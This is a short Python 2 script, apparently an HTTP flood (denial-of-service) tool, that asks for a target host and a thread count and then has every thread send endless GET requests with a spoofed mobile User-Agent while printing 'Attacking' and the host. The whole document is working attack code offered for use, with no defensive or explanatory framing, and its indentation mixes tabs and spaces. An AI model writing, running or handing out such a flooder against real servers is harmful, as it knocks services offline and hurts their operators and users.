import sys
import random
import requests
import threading

user_agent = [
  "Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d Build/OSR18H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
       ]

host = raw_input("İp : ")
thread_num = input("Threads : ")

def run():
	if len(sys.argv)>=1:
		url="http://"+host
		print "Attacking",host 
        while True:
			headers={'User-Agent': random.choice(user_agent)}
			r = requests.get(url,headers=headers)
			
	else:
		print "It only work on HTTP server!!!"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
